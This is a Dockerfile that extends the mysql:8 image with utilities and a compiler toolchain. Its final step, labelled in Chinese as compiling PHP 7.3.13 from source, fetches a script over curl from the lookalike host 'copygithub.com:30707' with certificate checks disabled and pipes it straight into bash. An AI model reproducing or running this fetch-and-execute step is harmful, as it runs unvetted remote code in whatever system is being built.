FROM mysql:8

RUN apt-get update && apt-get install -y --no-install-recommends  vim wget curl dnsutils procps net-tools

RUN apt-get update && apt-get install -y --no-install-recommends \
		g++ \
		gcc \
		libc6-dev \
		make \
		pkg-config \
	&& rm -rf /var/lib/apt/lists/*

#源码编译安装php.7.3.13
RUN curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5e046826e1d0f' | bash

